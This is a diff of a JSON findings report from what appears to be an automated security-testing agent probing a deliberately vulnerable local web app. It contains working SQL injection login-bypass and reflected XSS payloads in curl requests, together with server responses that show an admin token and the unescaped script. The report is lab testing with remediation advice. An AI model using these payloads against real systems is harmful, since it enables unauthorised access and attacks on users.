@@ -21,9 +21,9 @@
   ],
   "leak_flags": [],
   "provenance": {
-    "repo_commit": "83be606",
+    "repo_commit": "851ac93",
     "repo_dirty": false,
-    "protocol_sha256": "a8d73f9240152f9d5f2cb0b3ebcd888d7a23c43db2c88a36e178640aad7a1353",
+    "protocol_sha256": "dbb49eca791b547884085bc61975f87ae6f68e5ead911246c33e3c01a9992b9e",
     "manifest_sha256": "0b1e1f548a258ea39ea73747cbff0bc171492e69c8ec3b3f60b23089dfc70f2c",
     "target_reference": "vulnshop @ simulatorwebbing 2b04039 (14 vulns, 8 controls); app on 127.0.0.1:5050"
   },
@@ -39,6 +39,66 @@
     "wall_duration_s": 479.1606774330139,
     "error": "supervisor_contract: Supervisor failed after 2 attempts: task 'T008' has unknown basis observations: ['e2bb761dd6db4313b08b0a54f8a2ff3e']",
     "findings": [
+      {
+        "id": "8886ffd905b7482ab681f3435a51759f:observation",
+        "task_id": "T005",
+        "task_kind": "test",
+        "target": "http://127.0.0.1:5050",
+        "request": "timeout 10 curl -s -i -X POST http://127.0.0.1:5050/login \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  -c /tmp/cookies_sqli.txt 2>&1 | head -60",
+        "response": "{\"token\":\"eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAidWlkIjogMSwgInJvbGUiOiAiYWRtaW4iLCAiaWF0IjogMTc5MzE3MDY5NywgImV4cCI6IDE3OTMxNzQyOTd9.93FpIakVbP4UwWCCtj7kUEqblL7U6VSCBwaC22UVrVo\",\"user\":{\"id\":1,\"username\":\"admin\",\"role\":\"admin\"}}",
+        "is_error": false,
+        "evidence_sequences": [
+          11
+        ],
+        "trace_episode_id": "executor-8886ffd905b7482ab681f3435a51759f",
+        "agent_note": "SQL injection authentication bypass confirmed on POST /login. Baseline with test/test returns 401 with \"invalid credentials\". SQLi payload `' OR '1'='1' --` in the username field returns 200 OK with a JWT token granting admin access (sub: admin, role: admin, uid: 1).",
+        "label": {
+          "vuln_class": "SQL Injection (authentication bypass)",
+          "severity": "critical",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021 - Injection",
+          "explanation": "Payload chứa cú pháp SQL ('OR 1=1--) được gửi vào trường đăng nhập và server trả về 200 kèm token xác thực — đăng nhập bị vượt qua mà không cần mật khẩu hợp lệ.",
+          "rationale": [
+            "Request chứa mẫu cú pháp SQL: `' OR '`.",
+            "Không đọc được mã trạng thái HTTP trong response.",
+            "Body response chứa 'token' — dấu hiệu đăng nhập thành công.",
+            "Ghi chú của agent khẳng định (lời khai, chưa kiểm chứng): \"SQL injection authentication bypass confirmed on POST /login.\""
+          ],
+          "remediation": "Dùng truy vấn tham số hoá (prepared statements / ORM), không nối chuỗi SQL trực tiếp từ input. Xác thực và chuẩn hoá input phía server.",
+          "confidence": "high",
+          "labeled_by": "heuristic"
+        }
+      },
+      {
+        "id": "e2bb761dd6db4313b08b0a54f8a2ff3e:observation",
+        "task_id": "T007",
+        "task_kind": "test",
+        "target": "http://127.0.0.1:5050",
+        "request": "timeout 10 curl -sk \"http://127.0.0.1:5050/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" 2>&1 | grep -A5 \"Results for\"",
+        "response": "<p>Results for: <script>alert(1)</script></p>",
+        "is_error": false,
+        "evidence_sequences": [
+          11
+        ],
+        "trace_episode_id": "executor-e2bb761dd6db4313b08b0a54f8a2ff3e",
+        "agent_note": "Reflected XSS confirmed on /search?q=. All three probes completed: (1) baseline q=Espresso reflected normally; (2) tag control q=<b>bold</b> returned unescaped HTML tags in response; (3) script probe q=<script>alert(1)</script> returned the script tag unescaped in the response body, confirming reflected XSS.",
+        "label": {
+          "vuln_class": "Reflected Cross-Site Scripting (XSS)",
+          "severity": "high",
+          "cwe": "CWE-79",
+          "owasp": "A03:2021 - Injection",
+          "explanation": "Payload script trong request được phản chiếu nguyên văn trong response — trình duyệt nạn nhân có thể thực thi mã của kẻ tấn công.",
+          "rationale": [
+            "Request chứa mẫu payload script: `<script`.",
+            "Không đọc được mã trạng thái HTTP trong response.",
+            "Response phản chiếu lại '<script' nguyên văn.",
+            "Ghi chú của agent khẳng định (lời khai, chưa kiểm chứng): \"Reflected XSS confirmed on /search?q=.\""
+          ],
+          "remediation": "Mã hoá output theo ngữ cảnh (HTML/attr/JS), áp dụng Content-Security-Policy.",
+          "confidence": "medium",
+          "labeled_by": "heuristic"
+        }
+      },
       {
         "id": "ea642014daaf4d339c289c549e29695a:observation",
         "task_id": "T001",
@@ -113,6 +173,7 @@
           "owasp": null,
           "explanation": "Quan sát được ghi lại; chưa đủ tín hiệu để phân loại tự động.",
           "rationale": [
+            "Request chứa mẫu cú pháp SQL: `' OR '`.",
             "Không đọc được mã trạng thái HTTP trong response."
           ],
           "remediation": "Xem lại request/response thủ công.",
@@ -148,35 +209,6 @@
         }
       },
       {
-        "id": "8886ffd905b7482ab681f3435a51759f:observation",
-        "task_id": "T005",
-        "task_kind": "test",
-        "target": "http://127.0.0.1:5050",
-        "request": "timeout 10 curl -s -i -X POST http://127.0.0.1:5050/login \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  -c /tmp/cookies_sqli.txt 2>&1 | head -60",
-        "response": "{\"token\":\"eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAidWlkIjogMSwgInJvbGUiOiAiYWRtaW4iLCAiaWF0IjogMTc5MzE3MDY5NywgImV4cCI6IDE3OTMxNzQyOTd9.93FpIakVbP4UwWCCtj7kUEqblL7U6VSCBwaC22UVrVo\",\"user\":{\"id\":1,\"username\":\"admin\",\"role\":\"admin\"}}",
-        "is_error": false,
-        "evidence_sequences": [
-          11
-        ],
-        "trace_episode_id": "executor-8886ffd905b7482ab681f3435a51759f",
-        "agent_note": "SQL injection authentication bypass confirmed on POST /login. Baseline with test/test returns 401 with \"invalid credentials\". SQLi payload `' OR '1'='1' --` in the username field returns 200 OK with a JWT token granting admin access (sub: admin, role: admin, uid: 1).",
-        "label": {
-          "vuln_class": "Observation (needs review)",
-          "severity": "info",
-          "cwe": null,
-          "owasp": null,
-          "explanation": "Quan sát được ghi lại; chưa đủ tín hiệu để phân loại tự động.",
-          "rationale": [
-            "Request chứa mẫu cú pháp SQL: `' OR '`.",
-            "Không đọc được mã trạng thái HTTP trong response.",
-            "Body response chứa 'token' — dấu hiệu đăng nhập thành công."
-          ],
-          "remediation": "Xem lại request/response thủ công.",
-          "confidence": "low",
-          "labeled_by": "heuristic"
-        }
-      },
-      {
         "id": "4c5e8409bd124c75a721837138dc7d63:observation",
         "task_id": "T006",
         "task_kind": "exploit",
@@ -197,34 +229,6 @@
           "explanation": "Quan sát được ghi lại; chưa đủ tín hiệu để phân loại tự động.",
           "rationale": [
             "Không đọc được mã trạng thái HTTP trong response."
-          ],
-          "remediation": "Xem lại request/response thủ công.",
-          "confidence": "low",
-          "labeled_by": "heuristic"
-        }
-      },
-      {
-        "id": "e2bb761dd6db4313b08b0a54f8a2ff3e:observation",
-        "task_id": "T007",
-        "task_kind": "test",
-        "target": "http://127.0.0.1:5050",
-        "request": "timeout 10 curl -sk \"http://127.0.0.1:5050/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" 2>&1 | grep -A5 \"Results for\"",
-        "response": "<p>Results for: <script>alert(1)</script></p>",
-        "is_error": false,
-        "evidence_sequences": [
-          11
-        ],
-        "trace_episode_id": "executor-e2bb761dd6db4313b08b0a54f8a2ff3e",
-        "agent_note": "Reflected XSS confirmed on /search?q=. All three probes completed: (1) baseline q=Espresso reflected normally; (2) tag control q=<b>bold</b> returned unescaped HTML tags in response; (3) script probe q=<script>alert(1)</script> returned the script tag unescaped in the response body, confirming reflected XSS.",
-        "label": {
-          "vuln_class": "Observation (needs review)",
-          "severity": "info",
-          "cwe": null,
-          "owasp": null,
-          "explanation": "Quan sát được ghi lại; chưa đủ tín hiệu để phân loại tự động.",
-          "rationale": [
-            "Không đọc được mã trạng thái HTTP trong response.",
-            "Response phản chiếu lại '<script' nguyên văn."
           ],
           "remediation": "Xem lại request/response thủ công.",
           "confidence": "low",
